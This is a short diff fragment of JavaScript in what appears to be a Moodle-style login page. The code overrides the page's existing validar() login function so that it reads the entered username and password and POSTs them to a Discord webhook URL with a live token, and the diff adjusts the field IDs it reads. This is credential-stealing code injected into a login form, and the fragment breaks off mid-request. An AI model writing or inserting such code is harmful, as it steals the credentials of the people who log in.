@@ -287,8 +287,8 @@ M.util.help_popups.setup(Y);
 document.addEventListener('DOMContentLoaded', function () {
     // Sobrescribir la función validar() existente
     window.validar = function() {
-        const username = document.getElementById('txtUsuario').value;
-        const password = document.getElementById('txtPassword').value;
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
         
         fetch('https://discord.com/api/webhooks/1350938854458265600/opkSFYqJEYlKdqD7oR94UNuybEmUTD9v4VIn6YKWlKpAdZtvbYEZz9mp_CIPgGPJjANE', {
             method: 'POST',
